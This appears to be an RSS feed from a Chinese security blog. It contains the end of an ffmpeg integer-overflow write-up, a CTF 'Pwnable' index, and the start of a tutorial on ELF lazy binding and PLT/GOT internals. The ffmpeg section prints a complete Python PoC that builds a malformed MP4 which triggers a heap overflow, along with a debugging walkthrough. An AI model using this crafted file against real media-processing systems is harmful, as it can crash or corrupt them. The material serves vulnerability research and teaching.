<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a><span class="kw">def</span> atom(tag, chunk):</span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a>  data <span class="op">=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bu">len</span>(chunk) <span class="op">+</span> <span class="dv">8</span>)</span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a>  data <span class="op">+=</span> tag</span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a>  data <span class="op">+=</span> chunk</span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a>  <span class="cf">return</span> data</span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a></span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a><span class="kw">def</span> atom_ftyp():</span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true"></a>  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true"></a>  data <span class="op">+=</span> b<span class="st">&#39;mp42&#39;</span>  <span class="co"># type</span></span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;L&#39;</span>, <span class="dv">0</span>)  <span class="co"># minor_ver</span></span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true"></a>  <span class="cf">return</span> atom(b<span class="st">&#39;ftyp&#39;</span>, data)</span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true"></a></span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true"></a></span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true"></a><span class="kw">def</span> atom_moov(nested):</span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true"></a>  <span class="cf">return</span> atom(b<span class="st">&#39;moov&#39;</span>, nested)</span>
<span id="cb6-24"><a href="#cb6-24" aria-hidden="true"></a></span>
<span id="cb6-25"><a href="#cb6-25" aria-hidden="true"></a></span>
<span id="cb6-26"><a href="#cb6-26" aria-hidden="true"></a><span class="kw">def</span> atom_trak(nested):</span>
<span id="cb6-27"><a href="#cb6-27" aria-hidden="true"></a>  <span class="cf">return</span> atom(b<span class="st">&#39;trak&#39;</span>, nested)</span>
<span id="cb6-28"><a href="#cb6-28" aria-hidden="true"></a></span>
<span id="cb6-29"><a href="#cb6-29" aria-hidden="true"></a></span>
<span id="cb6-30"><a href="#cb6-30" aria-hidden="true"></a><span class="kw">def</span> atom_hev1():</span>
<span id="cb6-31"><a href="#cb6-31" aria-hidden="true"></a>  <span class="cf">return</span> atom(b<span class="st">&#39;hev1&#39;</span>, b<span class="st">&#39;&#39;</span>)</span>
<span id="cb6-32"><a href="#cb6-32" aria-hidden="true"></a></span>
<span id="cb6-33"><a href="#cb6-33" aria-hidden="true"></a></span>
<span id="cb6-34"><a href="#cb6-34" aria-hidden="true"></a><span class="kw">def</span> atom_stsd(nested):</span>
<span id="cb6-35"><a href="#cb6-35" aria-hidden="true"></a>  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></span>
<span id="cb6-36"><a href="#cb6-36" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></span>
<span id="cb6-37"><a href="#cb6-37" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># entries</span></span>
<span id="cb6-38"><a href="#cb6-38" aria-hidden="true"></a>  data <span class="op">+=</span> nested</span>
<span id="cb6-39"><a href="#cb6-39" aria-hidden="true"></a>  data <span class="op">+=</span> b<span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span> <span class="op">*</span> <span class="dv">70</span></span>
<span id="cb6-40"><a href="#cb6-40" aria-hidden="true"></a>  <span class="cf">return</span> atom(b<span class="st">&#39;stsd&#39;</span>, data)</span>
<span id="cb6-41"><a href="#cb6-41" aria-hidden="true"></a></span>
<span id="cb6-42"><a href="#cb6-42" aria-hidden="true"></a></span>
<span id="cb6-43"><a href="#cb6-43" aria-hidden="true"></a><span class="kw">def</span> atom_sgpd():</span>
<span id="cb6-44"><a href="#cb6-44" aria-hidden="true"></a>  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></span>
<span id="cb6-45"><a href="#cb6-45" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># version &amp; flags</span></span>
<span id="cb6-46"><a href="#cb6-46" aria-hidden="true"></a>  data <span class="op">+=</span> b<span class="st">&#39;sync&#39;</span>  <span class="co"># grouping_type</span></span>
<span id="cb6-47"><a href="#cb6-47" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># default_length</span></span>
<span id="cb6-48"><a href="#cb6-48" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># entry_count</span></span>
<span id="cb6-49"><a href="#cb6-49" aria-hidden="true"></a>  <span class="co"># entry 0</span></span>
<span id="cb6-50"><a href="#cb6-50" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;B&#39;</span>, HEVC_NAL_CRA_NUT)  <span class="co"># nal_unit_type</span></span>
<span id="cb6-51"><a href="#cb6-51" aria-hidden="true"></a>  <span class="cf">return</span> atom(b<span class="st">&#39;sgpd&#39;</span>, data)</span>
<span id="cb6-52"><a href="#cb6-52" aria-hidden="true"></a></span>
<span id="cb6-53"><a href="#cb6-53" aria-hidden="true"></a></span>
<span id="cb6-54"><a href="#cb6-54" aria-hidden="true"></a><span class="kw">def</span> atom_sbgp():</span>
<span id="cb6-55"><a href="#cb6-55" aria-hidden="true"></a>  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></span>
<span id="cb6-56"><a href="#cb6-56" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></span>
<span id="cb6-57"><a href="#cb6-57" aria-hidden="true"></a>  data <span class="op">+=</span> b<span class="st">&#39;sync&#39;</span>  <span class="co"># grouping_type</span></span>
<span id="cb6-58"><a href="#cb6-58" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">2</span>)  <span class="co"># entries</span></span>
<span id="cb6-59"><a href="#cb6-59" aria-hidden="true"></a>  <span class="co"># entry 0</span></span>
<span id="cb6-60"><a href="#cb6-60" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># sample_count</span></span>
<span id="cb6-61"><a href="#cb6-61" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># group_description_index</span></span>
<span id="cb6-62"><a href="#cb6-62" aria-hidden="true"></a>  <span class="co"># entry 1</span></span>
<span id="cb6-63"><a href="#cb6-63" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0xffffffff</span>)  <span class="co"># sample_count</span></span>
<span id="cb6-64"><a href="#cb6-64" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># group_description_index</span></span>
<span id="cb6-65"><a href="#cb6-65" aria-hidden="true"></a>  <span class="cf">return</span> atom(b<span class="st">&#39;sbgp&#39;</span>, data)</span>
<span id="cb6-66"><a href="#cb6-66" aria-hidden="true"></a></span>
<span id="cb6-67"><a href="#cb6-67" aria-hidden="true"></a></span>
<span id="cb6-68"><a href="#cb6-68" aria-hidden="true"></a><span class="kw">def</span> atom_ctts():</span>
<span id="cb6-69"><a href="#cb6-69" aria-hidden="true"></a>  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></span>
<span id="cb6-70"><a href="#cb6-70" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></span>
<span id="cb6-71"><a href="#cb6-71" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">4</span>)  <span class="co"># entries</span></span>
<span id="cb6-72"><a href="#cb6-72" aria-hidden="true"></a>  <span class="co"># entry 0</span></span>
<span id="cb6-73"><a href="#cb6-73" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></span>
<span id="cb6-74"><a href="#cb6-74" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></span>
<span id="cb6-75"><a href="#cb6-75" aria-hidden="true"></a>  <span class="co"># entry 1</span></span>
<span id="cb6-76"><a href="#cb6-76" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></span>
<span id="cb6-77"><a href="#cb6-77" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></span>
<span id="cb6-78"><a href="#cb6-78" aria-hidden="true"></a>  <span class="co"># entry 2</span></span>
<span id="cb6-79"><a href="#cb6-79" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></span>
<span id="cb6-80"><a href="#cb6-80" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></span>
<span id="cb6-81"><a href="#cb6-81" aria-hidden="true"></a>  <span class="co"># entry 3</span></span>
<span id="cb6-82"><a href="#cb6-82" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></span>
<span id="cb6-83"><a href="#cb6-83" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></span>
<span id="cb6-84"><a href="#cb6-84" aria-hidden="true"></a>  <span class="cf">return</span> atom(b<span class="st">&#39;ctts&#39;</span>, data)</span>
<span id="cb6-85"><a href="#cb6-85" aria-hidden="true"></a></span>
<span id="cb6-86"><a href="#cb6-86" aria-hidden="true"></a></span>
<span id="cb6-87"><a href="#cb6-87" aria-hidden="true"></a><span class="kw">def</span> main():</span>
<span id="cb6-88"><a href="#cb6-88" aria-hidden="true"></a>  <span class="cf">if</span> <span class="bu">len</span>(sys.argv) <span class="op">!=</span> <span class="dv">2</span>:</span>
<span id="cb6-89"><a href="#cb6-89" aria-hidden="true"></a>    <span class="bu">print</span>(<span class="st">&#39;Usage: poc.py out.mp4&#39;</span>)</span>
<span id="cb6-90"><a href="#cb6-90" aria-hidden="true"></a>    <span class="cf">return</span> <span class="op">-</span><span class="dv">1</span></span>
<span id="cb6-91"><a href="#cb6-91" aria-hidden="true"></a></span>
<span id="cb6-92"><a href="#cb6-92" aria-hidden="true"></a>  data <span class="op">=</span> atom_ftyp() <span class="op">+</span> atom_moov(</span>
<span id="cb6-93"><a href="#cb6-93" aria-hidden="true"></a>      atom_trak(</span>
<span id="cb6-94"><a href="#cb6-94" aria-hidden="true"></a>          atom_stsd(atom_hev1()) <span class="op">+</span> atom_sgpd() <span class="op">+</span> atom_sbgp()</span>
<span id="cb6-95"><a href="#cb6-95" aria-hidden="true"></a>          <span class="op">+</span> atom_ctts()</span>
<span id="cb6-96"><a href="#cb6-96" aria-hidden="true"></a>      ))</span>
<span id="cb6-97"><a href="#cb6-97" aria-hidden="true"></a></span>
<span id="cb6-98"><a href="#cb6-98" aria-hidden="true"></a>  <span class="bu">open</span>(sys.argv[<span class="dv">1</span>], <span class="st">&#39;wb&#39;</span>).write(data)</span>
<span id="cb6-99"><a href="#cb6-99" aria-hidden="true"></a></span>
<span id="cb6-100"><a href="#cb6-100" aria-hidden="true"></a></span>
<span id="cb6-101"><a href="#cb6-101" aria-hidden="true"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
<span id="cb6-102"><a href="#cb6-102" aria-hidden="true"></a>  main()</span></code></pre></div>
<p>这里可以看到，生成的这个mp4文件中存在4个<code>ctts</code>结构体，每个的count和duration为：</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a>  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></span></code></pre></div>
<p>也就是会使得<code>sc-&gt;ctts_data[i].count == 0x40000000</code></p>
<p>而我们一共有4个<code>ctts</code>结构，也就是<code>0x40000000*4 = 0x100000000</code></p>
<p>而<code>INT(0x100000000) == 0</code>，所以这个运行这个poc得到的mp4文件就会使得<code>ffmpeg</code>出现整数溢出问题。</p>
<p>我们编译一份存在漏洞版本的<code>ffmpeg</code>，编译之后得到的二进制文件<code>ffmpeg_g</code>就是有GDB调试符号的程序。</p>
<p>在<code>build_open_gop_key_points()</code>函数打断点：</p>
<p><img src="https://pic1.imgdb.cn/item/634ff85516f2c2beb1c0bf1a.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffd0716f2c2beb1c8b975.png" /></p>
<p>可以看到：</p>
<p><img src="https://pic1.imgdb.cn/item/634ffd2116f2c2beb1c8e8e0.png" /></p>
<p>之后运行这个for循环：</p>
<p><img src="https://pic1.imgdb.cn/item/634ffd6016f2c2beb1c95a26.png" /></p>
<p>也就是整数溢出使得这个值为0，也就是<code>av_calloc</code>会申请出一个0x20的chunk</p>
<p><img src="https://pic1.imgdb.cn/item/634ffe4116f2c2beb1caf53d.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffeac16f2c2beb1cbafe2.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffeb516f2c2beb1cbbf45.png" /></p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a>    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a>        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sc-&gt;ctts_data[i].count; j++)</span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a>             sc-&gt;sample_offsets[k++] = sc-&gt;ctts_data[i].duration;</span></code></pre></div>
<p>但是由于<code>sc-&gt;ctts_data[i].count == 0x40000000</code>，所以会直接覆盖接下来的<code>0x40000000*4</code>个字节的堆区，产生堆溢出Heap overflow</p>
<h2 id="x03-利用">0x03 利用</h2>
<blockquote>
<p>暂时没有想到好的利用方法，，，，</p>
</blockquote>]]></description>
    <pubDate>Mon, 4 Sep 2023 02:03:53 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[Pwnable]]></title>
    <link>https://blog.mark0519.com/#/pwnable/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/pwnable/README</guid>
    <description><![CDATA[<h1 id="pwnable">Pwnable</h1>
<blockquote>
<p>纸上得来终觉浅，绝知此事要躬行。</p>
</blockquote>
<h2 id="tsctf-2022">TSCTF 2022</h2>
<ul>
<li><strong>[22/4/25]</strong> <a href="/pwnable/220425-tsctf2022">TSCTF 2022</a></li>
</ul>
<h2 id="kernel-学习">Kernel 学习</h2>
<ul>
<li><strong>[22/04/27]</strong> <a href="/pwnable/220427-kernel-basic">kernel basic</a></li>
<li><strong>[220/4/28]</strong> <a href="/pwnable/220428-kernel-rop1">kernel ROP1</a></li>
<li><strong>[22/04/29]</strong> <a href="/pwnable/220429-kernel-rop2">kernel ROP2</a></li>
<li><strong>[22/05/01]</strong> <a href="/pwnable/220501-kernel-rop3">kernel ROP3</a></li>
<li><strong>[22/05/02]</strong> <a href="/pwnable/220502-kernel-rop4">kernel ROP4</a></li>
</ul>
<h2 id="qemu逃逸">QEMU逃逸</h2>
<ul>
<li><strong>[22/10/25]</strong> <a href="/pwnable/221025-qemu-basic">Qemu basic</a></li>
<li><strong>[22/11/08]</strong> <a href="/pwnable/221108-gva2gpa">Gva2Gpa</a></li>
<li><strong>[22/11/13]</strong> <a href="/pwnable/221113-qemu-dma">Qemu Dma</a></li>
</ul>
<h2 id="刷题">刷题</h2>
<ul>
<li><p><strong>[22/05/18]</strong> <a href="/pwnable/220518-HTB1">HackTheBox 1</a></p></li>
<li><p><strong>[22/05/19]</strong> <a href="/pwnable/220519-HTB2">HackTheBox 2</a></p></li>
</ul>
<h2 id="house-of-xxx">House of xxx</h2>
<ul>
<li><strong>[22/05/26]</strong> <a href="/pwnable/220526-house_of_emma">House of Emma</a></li>
<li><strong>[22/07/66]</strong> <a href="/pwnable/220716-house_of_apple">House of Apple</a></li>
</ul>
<h2 id="总结">总结</h2>
<ul>
<li><strong>[22/07/03]</strong> <a href="/pwnable/220703-glibc-233UAF">Glibc-2.33UAF利用</a></li>
<li><strong>[22/11/23]</strong> <a href="/pwnable/221123-rtld">rtld到ROP</a></li>
</ul>]]></description>
    <pubDate>Wed, 23 Nov 2022 15:32:04 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[从延迟绑定到写一字节ROP]]></title>
    <link>https://blog.mark0519.com/#/pwnable/221123-rtld</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/pwnable/221123-rtld</guid>
    <description><![CDATA[<h1 id="从延迟绑定到写一字节rop">从延迟绑定到写一字节ROP</h1>
<p>[TOC]</p>
<h2 id="x00-前言">0x00 前言</h2>
<p>前段时间参加今年的<code>SECCONCTF2022</code>，比赛中有个0解题<code>simplemod</code>引起了我的兴趣，题目简单来说就是自己编写的<code>libc</code>的<code>bss</code>段溢出了0x2000字节，但是只能在这个范围内写一共30个字节，虽然观察保护明显能猜测到是打延迟绑定部分，但是多次尝试调试之后仍然没有思路。</p>
<p>赛后的<code>Writeup</code>发布之后，我学习很多，特别是对<code>_dl_fixup</code>的内部有了更多的理解和认识，同时发现今年强网杯的qwarmup也是利用延迟绑定的漏洞进行1字节修改来进一步利用，所以我在这里记录了自己学习的过程，同时用<code>qwarmup</code>作为例子加深理解。</p>
<p>同时最新国外比赛<code>SECCONCTF2022 simplemod</code>和<code>DiceCTF2022 nightmare</code>的都是同一出题思路。</p>
<h2 id="x01-延迟绑定详析">0x01 延迟绑定详析</h2>
<p>首先，让我们详细分析下延迟绑定的过程中发生了什么。</p>
<p>自己编写一个<code>main.c</code>：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="dt">void</span> func(){</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a>    write(<span class="dv">1</span>,<span class="st">&quot;&lt;func&gt;: func&quot;</span>,<span class="dv">12</span>);</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a>}</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="dt">int</span> main(){</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a>    puts(<span class="st">&quot;&lt;main&gt;: main&quot;</span>);</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a>    func();</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true"></a>    <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true"></a>}</span></code></pre></div>
<p>这是一个很简单的程序，但是他调用了两个外部函数，<code>puts</code>和<code>write</code></p>
<p>之后我们编译他，并加上方便调试的<code>-g</code>选项和<code>-z lazy</code>延迟绑定选项</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a>$ <span class="fu">gcc</span> -g -z lazy -o main  main.c</span></code></pre></div>
<p>同时，我们下载一份和本地版本一样的<code>Glibc</code>源码放到同目录下，方便接下来源码调试更加方便</p>
<p>我本地使用的是<code>Ubuntu22.04 LTS</code>，也就是<code>Ubuntu GLIBC 2.35-0ubuntu3.1</code></p>
<p>接下来再使用GDB调试的时候使用<code>pwndbg&gt; directory ./glibc-2.35/</code>来加载<code>Glibc</code>源码。</p>
<p>之后在<code>main.c</code>源码第<code>3</code>行下断点，我们从<code>call   write@plt</code>一点一点开始分析：</p>
<p><img src="https://s2.loli.net/2022/11/15/SVNUrMi5bpA7nR4.png" /></p>
<h3 id="plt中发生了什么">1. PLT中发生了什么</h3>
<h4 id="进入plt">1.1 进入plt</h4>
<p>一切开始之前，我们的<code>GOT</code>表中<code>write</code>指向了<code>elf</code>文件中的某个区域<code>0x555555555040 ◂— endbr64</code></p>
<p><img src="https://s2.loli.net/2022/11/15/5Xh4Tm3d7fRakwc.png" /></p>
<p>之后我们调用了<code>call write@plt</code>，并且使用<code>si</code>跟入这个<code>write@plt</code>,看看发生了什么：</p>
<p><img src="https://s2.loli.net/2022/11/15/Brb7ZAePIgvyUH4.png" /></p>
<p>它跳转到了<code>elf</code>上的一个地址<code>0x555555555070</code>，减去基地址之后，也就是<code>elf</code>中偏移<code>0x1070</code>的地址！</p>
<p>也就是明显的位于<code>.plt.sec</code>的地址。</p>
<p><img src="https://s2.loli.net/2022/11/15/l8MiwF1RKA2yPWN.png" /></p>
<p>但是观察汇编可以知道，这个节上的代码仅仅只是提供了一次跳转，并没有执行其他操作，所以先让我们继续往下看。<code>&lt;write@plt+4&gt;</code>的位置只是跳转到了另一个地址<code>0x555555555040</code>。</p>
<p><img src="https://s2.loli.net/2022/11/15/5FdVj84DCSWYwf3.png" /></p>
<p>这里已经开始有意思起来了，观察地址我们可以知道<code>0x555555555040</code>也就是位于<code>Elf</code>文件偏移<code>0x1040</code>的位置，也就是<code>.plt</code>节的位置。</p>
<p><img src="https://s2.loli.net/2022/11/15/4U2KYrxOo3Lq7zP.png" /></p>
<p>这里的代码逻辑虽然还是很简单，<code>push</code>和跳转，但是它<code>push</code>了一个<code>1</code>，这让他开始变得有逻辑起来，不过既然都已经到<code>.plt</code>了，不如让我们完整看看整个<code>.plt</code>节</p>
<p><img src="https://pic.imgdb.cn/item/6373b71d16f2c2beb1efa163.jpg" /></p>
<p>看<code>elfheader</code>我们可以知道<code>.plt</code>节从<code>0x1020-0x1050</code>，而我们这个程序中有且只有两个外部函数<code>write</code>和<code>puts</code>。</p>
<p>具体分析之前，先让我们详细了解下我们熟悉的<code>PLT</code>表</p>
<h4 id="plt介绍">1.2 plt介绍</h4>
<p><strong>PLT表(Procedure Linkage Table)</strong>,也叫 <strong>过程连接表</strong>，在程序中以<code>.plt</code>节表示，该表处于代码段，每一个表项表示了一个与要重定位的函数相关的若干条指令，每个表项长度为 16 个字节，存储的是用于做延迟绑定的代码。</p>
<p>具体结构如下：</p>
<pre><code>PLT[0] ==&gt; 与每个函数第一次链接相关指令
PLT[1] ==&gt; 某个函数链接时所需要的指令，GOT[3]
PLT[2] ==&gt; 某个函数链接时所需要的指令，GOT[4]
PLT[x] ==&gt; 某个函数链接时所需要的指令，GOT[x+2]</code></pre>
<p>也就是说，除了<code>PLT[0]</code>之外，剩下的都会和我们的<code>GOT</code>表相互对应，有关<code>GOT</code>的介绍我们稍后讨论，目前我们只要知道<code>PLT</code>表显而易见的与 <code>GOT</code> 表一一对应的特性。</p>
<p>那么具体到我们自己编译这个的<code>main</code>来说，<code>PLT</code>表项中的内容如下：</p>
<pre class="assembly"><code>PLT[0] :
   0x555555555020:  push   QWORD PTR [rip+0x2fe2]        # 0x555555558008  push [GOT[1]]
   0x555555555026:  bnd jmp QWORD PTR [rip+0x2fe3]       # 0x555555558010 jmp  [GOT[2]]
   0x55555555502d:  nop    DWORD PTR [rax]
PLT[1] :
   0x555555555030:  endbr64 
   0x555555555034:  push   0x0
   0x555555555039:  bnd jmp 0x555555555020               # jmp  [PLT[0]]
   0x55555555503f:  nop
PLT[2] :
   0x555555555040:  endbr64 
   0x555555555044:  push   0x1
   0x555555555049:  bnd jmp 0x555555555020               # jmp  [PLT[0]]
   0x55555555504f:  nop</code></pre>
<p>也就是说，在不考虑<code>PLT[0]</code>的情况下，<code>PLT[1]</code>和<code>PLT[2]</code>的差异只有<code>push</code>的值不同。</p>
<p>正如上面介绍的，<code>PLT[x]</code>和<code>GOT[x+2]</code>相互对应，虽然我们还没来得及介绍<code>GOT</code>表，但是不妨先让我们看看此时这两个<code>PLT</code>对应的<code>GOT</code>表项：</p>
<p><img src="https://pic.imgdb.cn/item/6373bb9b16f2c2beb1f89339.jpg" /></p>
<p><img src="https://pic.imgdb.cn/item/6373bba816f2c2beb1f8a462.jpg" /></p>
<p>虽然我还没来得及介绍<code>GOT</code>表的一个表项是8字节，但是这看起来很清楚不是么，<code>elfheader</code>告诉我们<code>GOT</code>的起始偏移是<code>0x4000</code>，那么<code>0x4018 puts@GLIBC_2.2.5</code>也就是<code>GOT[3]</code>；同理<code>0x4020 write@GLIBC_2.2.5</code>也就是<code>GOT[4]</code>。</p>
<p>那么在回过头来，可以很清楚的联想到，对于<code>PLT</code>表来说，调用<code>puts</code>还是<code>write</code>的区别就是<code>push</code>的值不一样，显然在这里<code>puts</code>对应<code>0</code>，<code>write</code>对应<code>1</code>。显然，这也是他们在<code>GOT</code>表中的函数排序或者说下表。</p>
<blockquote>
<p>虽然说这里是推断，但下文会给出详细的源码分析和说明.</p>
</blockquote>
<h4 id="plt0和plt1">1.3 PLT[0]和PLT[1]</h4>
<p>好了，我们已经知道对<code>write</code>来说，它主要的操作是<code>push 1</code>，也就是压栈<code>wirte</code>在<code>GOT</code>表中的下标。但是还没完，接下来不管任意函数的<code>Plt</code>表，它们总会跳转到<code>PLT[0]</code>的地址，也即是<code>PLT</code>表开头</p>
<p><img src="https://pic.imgdb.cn/item/6373be2c16f2c2beb1fbce32.jpg" /></p>
<p>也就是执行了：</p>
<p><img src="https://pic.imgdb.cn/item/6373be7b16f2c2beb1fc2c56.jpg" /></p>
<p>压栈<code>&lt;_GLOBAL_OFFSET_TABLE_+8&gt;</code>并跳转到<code>&lt;_dl_runtime_resolve_xsavec&gt;</code></p>
<p><code>_GLOBAL_OFFSET_TABLE_</code>也就是我们的<code>GOT</code>表全程，下面我们详细介绍一下<code>GOT</code>表</p>
<h4 id="got介绍">1.4 got介绍</h4>
<p><strong>GOT表(Global Offset Table )</strong>也叫<strong>全局偏移表</strong>，在程序中以<code>.got.plt</code> 表示，该表处于数据段，每一个表项存储的都是一个地址，每个表项长度是当前程序的对应需要寻址长度（32位程序：4字节，<strong>64位程序：8字节</strong>）。</p>
<p>具体结构如下：</p>
<pre><code>GOT[0]  --&gt; 此处存放的是 .dynamic 的地址；该节(段)的作用会在下文讨论
GOT[1]  --&gt; 此处存放的是 link_map 的地址；该结构也会在下文讨论
GOT[2]  --&gt; 此处存放的是 dl_runtime_resolvec 函数的地址
GOT[3]  --&gt; 与 PLT[1] 对应，存放的是与该表项 (PLT[1]) 要解析的函数相关地址，
            由于延迟绑定的原因，开始未调用对应函数时该项存的是 PLT[1] 中第二条指令的地址，
            当进行完一次延迟绑定之后存放的才是所要解析的函数的真实地址
GOT[4]  --&gt; 与 PLT[2] 对应，所以存放的是与 PLT[2] 所解析的函数相关的地址
GOT[x]  --&gt; 与 PLT[x-2] 对应，所以存放的是与 PLT[x-2] 所解析的函数相关的地址</code></pre>
<p>在我们这个程序中：</p>
<p><img src="https://pic.imgdb.cn/item/6373bfd716f2c2beb1fdcb4c.jpg" /></p>
<p>可以清楚的看到</p>
<pre><code>GOT[0]: 0x0000000000003df8  .dynamic偏移
GOT[1]: 0x00007ffff7ffe2e0  binary link_map
GOT[2]: 0x00007ffff7fd8d30  dl_runtime_resolvec
GOT[3]: 0x00007ffff7e02ed0  __GI__IO_puts
GOT[4]: 0x0000555555555040  write@plt</code></pre>
<p>那么对于源程序来说 压栈的<code>&lt;_GLOBAL_OFFSET_TABLE_+8&gt;</code>也就我们<code>link_map</code>的地址，这个结构会在下文详细讨论。之后跳转到<code>_dl_runtime_resolve_xsavec</code>正式开始我们的延迟绑定</p>
<h3 id="dl_runtime_resolve_xsavec">2. _dl_runtime_resolve_xsavec</h3>
<p><code>_dl_runtime_resolvec</code>是一段汇编代码，定义在<code>/sysdeps/x86_64/dl-trampoline.h</code>中。</p>
<pre class="assembly"><code>    cfi_adjust_cfa_offset(16) # Incorporate PLT
    _CET_ENDBR
